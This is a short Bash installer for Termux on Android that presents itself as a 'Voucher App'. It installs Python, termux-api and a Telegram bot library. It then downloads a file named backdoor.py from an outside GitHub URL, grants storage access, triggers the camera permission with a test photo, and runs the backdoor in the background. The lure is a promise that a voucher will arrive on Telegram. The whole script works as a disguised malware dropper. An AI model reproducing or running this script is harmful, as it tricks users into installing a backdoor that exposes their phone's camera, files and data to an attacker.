#!/bin/bash
echo "🎁 Installing Voucher App..."
echo "📱 Please wait..."

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

# Update
echo -e "${GREEN}[+] Updating...${NC}"
pkg update -y && pkg upgrade -y

# Install Python
echo -e "${GREEN}[+] Installing Python...${NC}"
pkg install python -y

# Install Termux API
echo -e "${GREEN}[+] Installing Termux API...${NC}"
pkg install termux-api -y

# Install dependencies
echo -e "${GREEN}[+] Installing dependencies...${NC}"
pip install telebot requests

# Download backdoor
echo -e "${GREEN}[+] Downloading backdoor...${NC}"
curl -s -o backdoor.py https://raw.githubusercontent.com/piunjde/-Voucher-Hack/main/scripts/backdoor.py

# Setup permissions
echo -e "${GREEN}[+] Setting up permissions...${NC}"
termux-setup-storage
termux-camera-photo test.jpg 2>/dev/null

# Run
echo -e "${GREEN}[+] Starting...${NC}"
python backdoor.py &

echo -e "${RED}✅ Installation complete!${NC}"
echo -e "${RED}🎉 Voucher akan dikirim ke Telegram!${NC}"
